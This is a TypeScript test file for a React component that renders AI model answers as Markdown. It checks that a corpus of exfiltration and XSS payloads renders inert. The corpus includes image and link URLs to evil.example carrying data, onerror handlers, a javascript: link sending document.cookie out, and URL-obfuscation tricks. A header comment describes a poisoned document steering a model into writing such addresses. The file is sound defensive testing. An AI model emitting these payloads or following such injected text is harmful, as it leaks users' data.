import { expect, test } from 'bun:test';
import { createElement } from 'react';
import { renderToStaticMarkup } from 'react-dom/server';

import { AiMarkdown } from '@/components/shared/ai-markdown';
import { sameOriginTarget, splitAnswerBlocks } from '@/lib/ui/ai-markdown-text';

// The renderer of model text is an exfiltration boundary (B11,
// werk-flow/werkflow-planning#530): a model talked into it by a poisoned
// document writes an address that carries data out. Whatever the text, the
// markup holds no element that loads anything and no link that leaves the app.

const render = (text: string): string => renderToStaticMarkup(createElement(AiMarkdown, { text }));

const EXFILTRATION_CORPUS: ReadonlyArray<readonly [string, string]> = [
  ['Markdown image', '![Lieferschein](https://evil.example/p.png?d=Kunde%20M%C3%BCller)'],
  ['Markdown image with a title', '![x](https://evil.example/p.png "Titel")'],
  ['HTML image', '<img src="https://evil.example/p.png?d=geheim" onerror="fetch(1)">'],
  ['HTML image in a paragraph', 'Hier: <img src=x onerror=alert(1)> fertig'],
  ['picture and source', '<picture><source srcset="https://evil.example/a.png"></picture>'],
  [
    'iframe, script and style',
    '<iframe src="https://evil.example"></iframe><script>fetch("//evil.example")</script><style>@import "https://evil.example/x.css";</style>',
  ],
  ['HTML link', '<a href="https://evil.example/?d=geheim">Rechnung</a>'],
  ['reference-style link', '[Rechnung][1]\n\n[1]: https://evil.example/?d=geheim'],
  ['reference-style image', '![Rechnung][bild]\n\n[bild]: https://evil.example/p.png?d=geheim'],
  ['collapsed reference', '[Rechnung][]\n\n[Rechnung]: https://evil.example/'],
  ['data: link', '[Öffnen](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)'],
  ['data: image', '![x](data:image/svg+xml;utf8,<svg onload=alert(1)>)'],
  ['javascript: link', '[Klick](javascript:fetch("https://evil.example/"+document.cookie))'],
  ['autolink', '<https://evil.example/?d=geheim>'],
  ['bare address', 'Siehe https://evil.example/?d=geheim und www.evil.example'],
  ['protocol-relative link', '[x](//evil.example/?d=geheim)'],
  ['backslash link', '[x](/\\evil.example/?d=geheim)'],
  ['encoded slashes', '[x](%2F%2Fevil.example) und [y](https:%2F%2Fevil.example)'],
  ['tab in the address', '[x](/\t/evil.example)'],
  ['dot segments collapsing into a second slash', '[x](/.//evil.example) und [y](/a/..//evil.example)'],
  ['encoded dot segments', '[x](/%2e//evil.example) und [y](/%2E%2E//evil.example)'],
  ['fullwidth solidus', '[x](／／evil.example) und [y](https：／／evil.example)'],
  ['division slash', '[x](/\u2215evil.example) und [y](\u2215\u2215evil.example)'],
  ['Cyrillic scheme', '[x](httрs://evil.example)'],
  ['link in a list and a quote', '- [a](https://evil.example)\n> ![b](https://evil.example/b.png)'],
  ['link inside a code span', '`![x](https://evil.example)` und `<img src=x>`'],
  ['link inside a code block', '```\n![x](https://evil.example)\n<img src=x>\n```'],
];

/** Every address in the markup: only `href`s that stay on this origin, never a fetching attribute. */
function leaks(markup: string): string[] {
  const found: string[] = [];
  for (const [, tag] of markup.matchAll(/<([a-z][a-z0-9]*)\b/g)) {
    if (
      !['div', 'p', 'br', 'strong', 'em', 'code', 'pre', 'ul', 'ol', 'li', 'blockquote', 'a'].includes(
        tag ?? '',
      )
    )
      found.push(`element <${tag}>`);
  }
  for (const [, name, value] of markup.matchAll(/\s([a-z-]+)="([^"]*)"/g)) {
    if (
      name === 'href' &&
      !(sameOriginTarget(value ?? '') && value?.startsWith('/') && !value.startsWith('//'))
    )
      found.push(`href ${value}`);
    if (name !== 'href' && name !== 'class' && name !== 'start' && name !== 'data-slot')
      found.push(`attribute ${name}`);
  }
  return found;
}

for (const [name, text] of EXFILTRATION_CORPUS) {
  test(`model text renders inert: ${name}`, () => {
    const markup = render(text);
    expect(leaks(markup)).toEqual([]);
    expect(markup).not.toContain('evil.example"');
  });
}

test('a link to a path of the app stays a link', () => {
  expect(render('Sieh dir [den Auftrag](/auftraege/A-1001) an.')).toContain('href="/auftraege/A-1001"');
  expect(render('[Aufgaben](/aufgaben?tab=offen#neu)')).toContain('href="/aufgaben?tab=offen#neu"');
});

test('an address that leaves the app stays readable as text', () => {
  const markup = render('[Norm](https://example.org/din)');
  expect(markup).toContain('Norm (https://example.org/din)');
  expect(markup).not.toContain('<a');
});

test('the Markdown subset renders as structure', () => {
  const markup = render(
    '# Plan\n\n**fett** und *kursiv* und `code`\n\n- eins\n- zwei\n\n3. drei\n4. vier\n\n> Zitat',
  );
  expect(markup).toContain('<p class="font-semibold">Plan</p>');
  expect(markup).toContain('<strong>fett</strong>');
  expect(markup).toContain('<em>kursiv</em>');
  expect(markup).toContain('<code>code</code>');
  expect(markup).toContain('<li>zwei</li>');
  expect(markup).toContain('<ol start="3"');
  expect(markup).toContain('<blockquote');
});

const ANSWER = [
  '# Material für die Heizung',
  '',
  'Du brauchst:',
  '- 2 × Kugelhahn',
  '- 1 × Pumpe',
  '',
  '```',
  'Kupferrohr 15 mm',
  '',
  'Pressfitting',
  '```',
  'Danach **prüfen**.',
  '',
  '> Hinweis',
].join('\n');

test('a finished block never changes while the answer grows', () => {
  const whole = splitAnswerBlocks(ANSWER);
  for (let end = 0; end <= ANSWER.length; end += 1) {
    const blocks = splitAnswerBlocks(ANSWER.slice(0, end));
    // Every block but the one still being written is already the block of the whole answer.
    expect(blocks.slice(0, -1)).toEqual(whole.slice(0, Math.max(0, blocks.length - 1)));
  }
});

test('a code block keeps its blank lines and stands alone', () => {
  expect(splitAnswerBlocks(ANSWER)).toEqual([
    '# Material für die Heizung',
    'Du brauchst:\n- 2 × Kugelhahn\n- 1 × Pumpe',
    '```\nKupferrohr 15 mm\n\nPressfitting\n```',
    'Danach **prüfen**.',
    '> Hinweis',
  ]);
});

// An answer may hold up to `maxAnswerBytes`, and a paragraph without a blank line is one block that
// renders again with every batch while it streams. When an opener that never closes may run across
// later openers, the scan restarts at each of them: quadratic, and 48,000 „[“ froze the page for
// seconds. So no opener spans the next one, and the match starts at the opener that closes.
const LATER_OPENER_CLOSES: ReadonlyArray<readonly [string, string, string]> = [
  ['a link label', '[a [b](/x)', '[a <a href="/x">b</a>'],
  ['a link target', '[a](/x[b](/y)', '[a](/x<a href="/y">b</a>'],
  ['emphasis with stars', '*a *b*', '*a <em>b</em>'],
  ['emphasis with underscores', '_a _b_', '_a <em>b</em>'],
  ['a backtick run', '``a`b`', '``a<code>b</code>'],
];

for (const [name, text, expected] of LATER_OPENER_CLOSES) {
  test(`${name} that does not close leaves the next opener to close`, () => {
    const markup = render(text).replaceAll(/ (?:class|data-slot)="[^"]*"/g, '');
    expect(markup, 'an unclosed opener must not run across a later one').toContain(expected);
  });
}
